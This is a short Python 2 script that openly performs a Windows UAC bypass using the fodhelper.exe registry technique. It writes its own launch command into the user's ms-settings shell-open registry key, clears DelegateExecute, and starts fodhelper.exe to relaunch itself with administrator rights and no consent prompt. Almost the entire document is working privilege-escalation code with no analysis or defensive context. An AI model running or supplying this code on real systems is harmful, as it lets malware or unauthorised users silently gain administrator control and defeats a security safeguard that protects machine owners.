import os
import sys
import ctypes
import _winreg
import sys
import subprocess

CMD                   = r"C:\Windows\System32\cmd.exe"
FOD_HELPER            = r'C:\Windows\System32\fodhelper.exe'
PYTHON_CMD            = "python"
REG_PATH              = 'Software\Classes\ms-settings\shell\open\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'
def is_running_as_admin():
    '''
    Checks if the script is running with administrative privileges.
    Returns True if is running as admin, False otherwise.
    '''    
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
def create_reg_key(key, value):
    '''
    Creates a reg key
    '''
    try:        
        _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, REG_PATH, 0, _winreg.KEY_WRITE)                
        _winreg.SetValueEx(registry_key, key, 0, _winreg.REG_SZ, value)        
        _winreg.CloseKey(registry_key)
    except WindowsError:        
        raise
def bypass_uac(cmd):
    '''
    Tries to bypass the UAC
    '''
    try:
        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
        create_reg_key(None, cmd)    
    except WindowsError:
        raise
def execute():        
    #print sys.path
    sys.path.append('C:\Windows\System32')
    if not is_running_as_admin():
        print '[!] The script is NOT running with administrative privileges'
        print '[+] Trying to bypass the UAC'
        try:                
            current_dir =   __file__
            cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, current_dir)
            bypass_uac(cmd)                
            subprocess.call("cmd.exe /k fodhelper.exe")            
            sys.exit(0)                
        except WindowsError:
            sys.exit(1)
    else:
        print '[+] The script is running with administrative privileges!'        
if __name__ == '__main__':
    execute()